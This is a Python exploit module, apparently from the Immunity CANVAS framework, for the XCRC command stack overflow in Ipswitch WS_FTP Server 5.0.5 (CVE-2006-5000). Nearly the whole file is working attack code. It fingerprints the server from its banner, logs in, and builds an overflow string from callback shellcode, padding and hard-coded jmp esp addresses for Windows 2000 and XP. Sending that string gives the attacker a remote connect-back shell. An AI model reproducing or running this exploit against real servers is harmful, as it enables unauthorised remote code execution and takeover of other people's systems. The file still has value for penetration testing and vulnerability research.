#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

# CANVAS modules
from exploitutils import *
from tcpexploit import *

# GUI info
NAME='Ipswitch WS_FTP Server XCRC Overflow'
DESCRIPTION='Ipswitch WS_FTP Server XCRC Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION['Date public']='09/26/06'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-06-029.html'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION["CVE Name"] = "CVE-2006-5000"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5000"
DOCUMENTATION['CVSS'] = 6.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

NOTES="""
Contrary to what the advisory says 5.0.4 doesn't seem to be vulnerable
since the commands XCRC, XMD5, were introduced in 5.0.5. This one is a
nightmare to turn SP and Language independant since it doesn't allow \0
and no register points to our data. Moreover we cannot reach SEH,
meaning that all that is left is the good old jmp esp in any DLL.
"""

CHANGELOG="""
"""

targets={
    0: ['Autoversioning (N/A)',0],
    1: ['Ipswitch WS_FTP Server 5.0.5 on Windows 2000 SP4 English',0x75031dce], #jmp esp @ ws2_32.dll
    2: ['Ipswitch WS_FTP Server 5.0.5 on Windows XP SP1a English',0x71ab7bfb] #jmp esp @ ws2_32.dll
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)
        self.port=21
        self.badstring='\0\r\n \t,'
        self.user='anonymous'
        self.password='ftp@somewhere.bs'
        self.options=['-O user:username','-O password:password']
        self.checkversion=1
        self.subesp=2000
        return
    
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def connectTo(self,host,port):
        s=self.gettcpsock()
        try:
            s.connect((host,port))
        except:
            print 'Could not connect to %s:%d'%(host,port)
            return None
        return s

    def getBanner(self,s):
        import select 
        try:
            readline=1
            response=''
            while readline:
                r,w,x=select.select([s],[],[],2)
                if r==[]: # timeout
                    readline=0
                else: # line
                    response+=s.recv(256,0)
        except:
            self.log('Timeout on recv()')
        print 'Banner: '+response
        return response

    def getHostlen(self, host, port):
        s=self.connectTo(host,port)
        response=s.recv(256,0)
        s.close()
        return (response.find(' ')-response.find('-')-1)     
   
    def test(self):
        #self.getArgs()
        s=self.connectTo(self.host,self.port)
        response=self.getBanner(s)
        if response.count('WS_FTP'):
            self.log('Found Ipswitch WS_FTP Server banner, checking version...')
            if self.checkversion:
                if response.count('5.0.5'):
                    self.log('Vulnerable Ipswitch WS_FTP Server version found')
                    return 1
                else:
                    self.log('Could not determine Ipswitch WS_FTP Server version')
                    return 0                
        else:
            self.log('Coulnt not find an Ipswitch WS_FTP Server banner')
            return 0
        # passed all tests
        return 1
    
    def createShellcode(self):
        self.shellcode=self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def ftpLogin(self,s,user,password,expectfail=0):
        s.send('USER %s\r\n'%(user))
        try:
            response=s.recv(256,0)
        except:
            self.log('ftpLogin USER timeout')
            return 0
        s.send('PASS %s\r\n'%(password))
        try:
            response=s.recv(256,0)
        except:
            self.log('ftpLogin PASS timeout') 
            return 0
        if response.count('530 '):
            if expectfail:
                self.log('Expected login failure, keeping FTP connection open')
                return 0
            else:
                s.send('QUIT\r\n')
                self.log('FTP login failed')
            return 0
        if response.count('230 '):
            self.log('FTP login succeeded')
            return 1
        self.log('Response Unexpected, pretending it worked: %s'%(response))
        return 1
    
    def buildString(self):
        self.description,self.eip=targets[self.version]
        import struct
        if len(self.shellcode)>676:
            self.log('Shellcode is too big')
            return 'QUIT\r\n'
        writeString=''
        writeString+=self.shellcode
        writeString+='A'*(676-len(writeString))
        writeString+=struct.pack('<L',self.eip)
        writeString+='BBBB'
        from MOSDEF import mosdef
        writeString+=mosdef.assemble('jmp $-%d'%(len(writeString)+5),'X86')
        return 'XCRC ' + writeString + '\r\n'
    
    def getArgs(self):
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        self.port=int(self.argsDict.get('port',self.port))
        self.host=self.target.interface
        return
    
    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        s=self.connectTo(self.host,self.port)
        if(s==None):
            return False
        self.getBanner(s)
        if self.ftpLogin(s,self.user,self.password):
            self.websend(s,self.buildString())
        else:
            self.log('Could not log in')
            self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
            return 0
        time.sleep(2)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (succeeded!)'%(NAME,self.host,self.port))
        else:
            self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
            return 0
        self.setState('done')
        return 1

    def displayVersions(self):
        i=0
        for line in targets.values():
            print '%d: %s'%(i,line[0])
            i+=1
   
if __name__=='__main__':
    print 'Running CANVAS '+NAME+' version '+VERSION
    app=theexploit()
    ret=standard_callback_commandline(app)
